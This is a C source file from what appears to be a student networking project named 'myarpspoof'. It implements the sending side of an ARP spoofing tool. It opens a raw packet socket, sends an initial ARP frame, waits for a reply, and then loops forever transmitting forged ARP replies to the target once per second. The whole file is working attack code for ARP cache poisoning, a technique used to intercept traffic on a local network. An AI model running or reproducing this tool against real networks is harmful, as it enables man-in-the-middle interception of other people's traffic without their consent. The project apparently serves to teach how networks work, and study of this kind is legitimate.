/*
** EPITECH PROJECT, 2019
** NWP_myarpspoof_2018
** File description:
** send.c
*/

#include "core.h"

static int send_final_packet(core_t *core)
{
    fill_arp(core, core->opcode);
    memcpy(core->ether_frame + ETH_HDRLEN, &(core)->arphdr,
        ARP_HDRLEN * sizeof(uint8_t));
    if ((core->sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
        perror("socket() failed ");
        return (84);
    }
    if ((core->bytes = sendto(core->sd, core->ether_frame, core->frame_length,
        0, (struct sockaddr *) &(core)->device, sizeof(core->device))) <= 0) {
            perror("sendto() failed");
            return (84);
    }
    close(core->sd);
    return (0);
}

static int send_loop(core_t *core)
{
    while (1) {
        core->opcode = ARPOP_REPLY;
        send_final_packet(core);
        printf("Spoofed packet sent to: '%s'\n", core->ip_dst);
        sleep(1);
    }
    return (0);
}

int send_packet(core_t *core)
{
    if (initialize_packet(core))
        return (84);
    send_final_packet(core);
    if (receive(core))
        return (84);
    send_loop(core);
    return (0);
}
